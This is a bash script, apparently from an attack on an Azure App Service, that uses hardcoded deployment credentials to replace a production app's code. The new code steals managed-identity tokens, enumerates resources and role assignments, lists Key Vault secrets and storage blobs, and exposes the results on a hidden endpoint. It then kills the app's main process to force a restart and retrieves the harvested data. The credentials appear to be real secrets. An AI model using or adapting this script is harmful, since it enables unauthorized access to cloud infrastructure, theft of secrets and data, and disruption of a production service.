#!/bin/bash
set -e

# SCM creds
SCM_USER='$app-tbl-reporting-prod'
SCM_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'
SCM_BASE="https://app-tbl-reporting-prod.scm.azurewebsites.net"

# Upload new app.py via VFS
APP_CODE='import os,json,urllib.request,urllib.error
def http(url,h=None,t=20):
    try:
        r=urllib.request.urlopen(urllib.request.Request(url,headers=h or{}),timeout=t)
        return r.status,r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code,e.read().decode("utf-8","replace")[:2000]
    except Exception as e:
        return 0,str(e)
from flask import Flask
app=Flask(__name__)
@app.route("/")
def root():return "rg-probe-v4"
@app.route("/e")
def e():
    out={}
    ie=os.environ.get("IDENTITY_ENDPOINT","")
    ih=os.environ.get("IDENTITY_HEADER","")
    cid="7a85156a-01c4-4e61-8472-40a92107159b"
    out["ie"]=ie;out["ih_len"]=len(ih)
    for res,name in [("https://management.azure.com","mgmt"),("https://vault.azure.net","vault"),("https://storage.azure.com","storage")]:
        u=f"{ie}?api-version=2019-08-01&resource={res}&client_id={cid}"
        st,b=http(u,{"X-IDENTITY-HEADER":ih})
        if st==200:
            t=json.loads(b).get("access_token","")
            out[f"{name}_len"]=len(t)
            if name=="mgmt":
                sub="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
                mh={"Authorization":f"Bearer {t}"}
                _,b2=http(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01",mh)
                out["reporting_resources"]=b2[:3000]
                _,b3=http(f"https://management.azure.com/subscriptions/{sub}/resourcegroups?api-version=2021-04-01",mh)
                out["rgs"]=b3[:1000]
                _,b4=http(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01",mh)
                out["reporting_roles"]=b4[:2000]
                _,b5=http(f"https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments?\\$filter=principalId%20eq%20%27f64d08c7-fde6-4553-99c8-5bf73666ee8c%27&api-version=2022-04-01",mh)
                out["mi_roles"]=b5[:1000]
                # Check for resources in reporting RG
                for rt in ["Microsoft.Storage/storageAccounts","Microsoft.KeyVault/vaults","Microsoft.Web/sites"]:
                    _,b6=http(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-reporting-prod-eus/providers/{rt}?api-version=2023-01-01",mh)
                    out[f"rep_{rt.split('/')[-1]}"]=b6[:1000]
            if name=="vault":
                vh={"Authorization":f"Bearer {t}"}
                _,b7=http("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4",vh)
                out["kv2_secrets"]=b7[:1000]
            if name=="storage":
                sh={"Authorization":f"Bearer {t}","x-ms-version":"2020-10-02"}
                for a in ["sttblbackupprodx3euoz","sttblappcfgprodx3euoz"]:
                    _,b8=http(f"https://{a}.blob.core.windows.net/?comp=list",sh)
                    out[f"cont_{a[:10]}"]=b8[:500]
                    for c in ["exports","config"]:
                        _,b9=http(f"https://{a}.blob.core.windows.net/{c}?restype=container&comp=list",sh)
                        if "Name" in b9:
                            out[f"blob_{a[:10]}_{c}"]=b9[:1500]
        else:
            out[f"{name}_err"]=f"{st}:{b[:200]}"
    return json.dumps(out,indent=1)
if __name__=="__main__":
    app.run(host="0.0.0.0",port=8000)
'

echo "=== UPLOAD ==="
UPLOAD_CODE=$(echo -n "$APP_CODE" | base64 -w0)
curl -sS -X PUT "$SCM_BASE/api/vfs/site/wwwroot/app.py" \
  -u "$SCM_USER:$SCM_PASS" \
  -H "If-Match: *" \
  -H "Content-Type: application/octet-stream" \
  --data-binary "$APP_CODE" -w "%{http_code}"
echo ""

# Trigger restart via process kill
echo "=== RESTART ==="
curl -sS -X POST "$SCM_BASE/api/command" \
  -u "$SCM_USER:$SCM_PASS" \
  -H "Content-Type: application/json" \
  -d '{"command":"kill 1 2>/dev/null; echo done","dir":"/home"}' | jq -r '.Output // .Error'

sleep 20

# Fetch /e endpoint
echo "=== PROBE ==="
for i in 1 2 3 4 5; do
  RESULT=$(curl -sS --max-time 30 "https://app-tbl-reporting-prod.azurewebsites.net/e" 2>/dev/null)
  if [ $? -eq 0 ] && [ -n "$RESULT" ]; then
    echo "RESULT_B64=$(echo "$RESULT" | base64 -w0)"
    break
  fi
  echo "retry $i..."
  sleep 10
done

echo "=== CHECK ROOT ==="
curl -sS --max-time 10 "https://app-tbl-reporting-prod.azurewebsites.net/"

echo ""
echo "=== DONE ==="